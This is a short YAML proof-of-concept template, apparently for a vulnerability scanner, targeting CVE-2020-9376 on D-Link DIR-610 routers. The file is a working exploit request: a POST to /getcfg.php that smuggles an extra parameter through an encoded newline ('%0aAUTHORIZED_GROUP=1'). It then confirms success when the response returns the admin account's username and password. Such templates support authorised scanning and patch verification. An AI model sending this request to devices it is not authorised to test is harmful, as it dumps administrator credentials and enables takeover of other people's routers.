detail:
  Affected Version: Dlink DIR-610
  author: x1n9Qi8
  links:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9376
expression: r0()
manual: true
name: poc-yaml-dlink-cve-2020-9376-dump-credentials
rules:
  r0:
    expression: response.status == 200 && response.content_type.contains("xml") &&
      response.body.bcontains(b"<name>Admin</name>") && response.body.bcontains(b"</usrid>")
      && response.body.bcontains(b"</password>")
    request:
      body: SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1
      cache: true
      headers:
        Content-Type: application/x-www-form-urlencoded
      method: POST
      path: /getcfg.php
transport: http
